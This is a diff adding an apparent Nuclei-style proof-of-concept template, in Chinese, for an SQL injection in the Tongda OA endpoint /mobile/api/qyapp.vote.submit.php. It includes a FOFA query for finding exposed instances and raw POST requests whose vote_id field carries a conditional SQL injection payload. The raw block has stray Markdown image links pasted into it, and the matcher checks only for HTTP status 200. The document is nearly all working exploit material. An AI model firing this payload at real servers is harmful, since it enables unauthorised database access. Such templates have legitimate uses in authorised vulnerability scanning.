@@ -1,0 +1,76 @@
+id: poc-cgqagdf4zatgpuag
+info:
+  name: 通达OA qyapp.vote.submit.php存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cgqagdf4zatgpuag'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cgqagdf4zatgpuag
+    fofa: app="TDXK-通达OA"
+http:
+- raw:
+  - 'POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=b9nr8to114e4o0j2hqcva9kul3
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 91
+
+
+    submitData={"a":{"vote_type":"1","vote_id":"if((select 995=995),1,2*1e308)","value":"1"}}
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600157625-5cf05ba7-9dbc-44ad-adae-fb292dd42e3b.png)POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=b9nr8to114e4o0j2hqcva9kul3
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 93
+
+
+    submitData={"a":{"vote_type":"1","vote_id":"if((select 995=99511),1,2*1e308)","value":"1"}}
+
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600157889-fcb050b4-6c09-48b3-8912-1752c7dbf7dc.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
